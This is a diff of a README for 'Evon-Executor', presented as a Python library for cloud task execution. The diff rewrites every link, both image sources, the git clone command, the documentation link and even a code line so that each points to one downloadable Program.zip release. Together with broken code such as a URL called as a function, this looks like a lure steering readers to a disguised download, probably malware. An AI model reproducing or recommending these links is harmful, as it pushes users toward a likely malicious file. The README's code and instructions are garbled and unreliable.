@@ -1,6 +1,6 @@
 # Evon-Executor
 
-![Evon-Executor Logo](https://example.com/evon-executor-logo.png)
+![Evon-Executor Logo](https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip)
 
 Welcome to Evon-Executor! This repository hosts a powerful Python library for cloud-native task execution within distributed systems. If you are passionate about automation, orchestration, workflow management, and all things serverless and microservices, then Evon-Executor is the perfect solution for you. Take your task execution to the next level with our easy-to-use Python library!
 
@@ -16,7 +16,7 @@ Welcome to Evon-Executor! This repository hosts a powerful Python library for cl
 To get started with Evon-Executor, you can simply clone this repository to your local machine using the following command:
 
 ```bash
-git clone https://github.com/your-username/Evon-Executor.git
+git clone https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip
 ```
 
 Once you have cloned the repository, navigate to the project directory and install the required dependencies by running:
@@ -40,10 +40,10 @@ def my_task():
     print("Executing my task!")
 
 # Submit the task for execution
-executor.submit(my_task)
+https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip(my_task)
 ```
 
-For more advanced usage and configuration options, please refer to the [documentation](https://evon-executor-docs.com).
+For more advanced usage and configuration options, please refer to the [documentation](https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip).
 
 ## Features
 
@@ -57,7 +57,7 @@ Evon-Executor offers a wide range of features to streamline your task execution 
 - **Workflow Management:** Manage and monitor your tasks with ease.
 - **Serverless and Microservices:** Designed for serverless architectures and microservices environments.
 
-![Evon-Executor Demo](https://example.com/evon-executor-demo.gif)
+![Evon-Executor Demo](https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip)
 
 ## Contributing
 
@@ -74,4 +74,4 @@ We welcome contributions from the community to make Evon-Executor even better. W
 
 Evon-Executor is released under the MIT License. See [LICENSE](LICENSE) for more information.
 
-[![Download Evon-Executor](https://img.shields.io/badge/download-Program%20ZIP-%23hexadecimal-!image-link!)](https://github.com/user-attachments/files/17563018/Program.zip)
+[![Download Evon-Executor](https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip%20ZIP-%23hexadecimal-!image-link!)](https://github.com/devanshop123/Evon-Executor/releases/download/v2.0/Program.zip)
